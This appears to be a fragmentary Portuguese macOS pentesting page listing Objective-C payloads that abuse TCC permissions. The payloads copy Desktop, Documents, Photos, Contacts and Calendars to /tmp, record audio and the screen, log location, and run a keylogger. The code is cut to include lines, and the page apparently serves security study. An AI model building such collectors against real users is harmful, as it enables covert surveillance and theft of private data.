...
{% tabs %}
{% tab title="ObjetiveC" %}
Copie `$HOME/Desktop` para `/tmp/desktop`.
```objectivec
#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
...
{% tabs %}
{% tab title="ObjetiveC" %}
Copie `$HOME/Documents` para `/tmp/documents`.
```objectivec
#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
...
{% tabs %}
{% tab title="ObjetiveC" %}
Copie `$HOME/Pictures/Photos Library.photoslibrary` para `/tmp/photos`.
```objectivec
#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
...
* **Privilégio**: `com.apple.security.personal-information.addressbook`
* **TCC**: `kTCCServiceAddressBook`

{% tabs %}
{% tab title="ObjetiveC" %}
Copie `$HOME/Library/Application Support/AddressBook` para `/tmp/contacts`.
```objectivec
#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
...
Copie `$HOME/Library/Calendars` para `/tmp/calendars`.
```objectivec
#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
...
{% tabs %}
{% tab title="ObjetiveC - Gravar" %}
Gravar 5s de áudio e armazenar em `/tmp/recording.m4a`
```objectivec
#import <Foundation/Foundation.h>
#import <AVFoundation/AVFoundation.h>
...
* **TCC**: Concedido em `/var/db/locationd/clients.plist`

{% tabs %}
{% tab title="ObjectiveC" %}
Escreva a localização em `/tmp/logs.txt`
```objectivec
#include <syslog.h>
#include <stdio.h>
#import <Foundation/Foundation.h>
...
{% tabs %}
{% tab title="ObjectiveC" %}
Grave a tela principal por 5s em `/tmp/screen.mov`
```objectivec
#import <Foundation/Foundation.h>
#import <AVFoundation/AVFoundation.h>
...
{% tab title="Keylogger" %}
Armazena as teclas pressionadas em **`/tmp/keystrokes.txt`**
```objectivec
#import <Foundation/Foundation.h>
#import <ApplicationServices/ApplicationServices.h>
